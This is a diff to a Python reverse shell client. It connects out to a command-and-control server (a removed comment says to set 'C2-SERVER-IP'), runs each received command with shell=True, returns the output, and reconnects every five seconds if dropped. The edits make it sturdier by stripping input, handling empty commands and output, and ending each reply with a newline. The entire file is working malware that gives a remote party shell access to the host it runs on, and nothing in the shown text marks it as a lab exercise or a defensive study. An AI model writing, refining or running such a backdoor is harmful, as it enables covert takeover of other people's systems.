@@ -1,5 +1,3 @@
-# Be sure to change the C2-SERVER-IP before running
-
 import socket
 import subprocess
 import os
@@ -15,7 +13,9 @@ def reverse_shell(server_ip, server_port):
             while True:
                 try:
                     # Receive command from the server
-                    command = s.recv(1024).decode('utf-8')
+                    command = s.recv(1024).decode('utf-8').strip()
+                    if not command:
+                        continue
                     if command.lower() == 'exit':
                         break
 
@@ -23,15 +23,18 @@ def reverse_shell(server_ip, server_port):
                     if command.startswith('cd '):
                         try:
                             os.chdir(command.strip('cd '))
-                            s.send(b'Changed directory')
+                            s.send(b'Changed directory\n')
                         except FileNotFoundError as e:
-                            s.send(str(e).encode('utf-8'))
+                            s.send(f"Error: {e}\n".encode('utf-8'))
                     else:
                         result = subprocess.run(command, shell=True, capture_output=True)
-                        s.send(result.stdout + result.stderr)
+                        output = result.stdout + result.stderr
+                        if not output:
+                            output = b'No output\n'
+                        s.send(output + b'\n')
                 
                 except Exception as e:
-                    s.send(f"Error: {e}".encode('utf-8'))
+                    s.send(f"Error: {e}\n".encode('utf-8'))
         
         except (socket.error, ConnectionResetError, ConnectionAbortedError) as e:
             print(f"Connection error: {e}. Retrying in 5 seconds...")
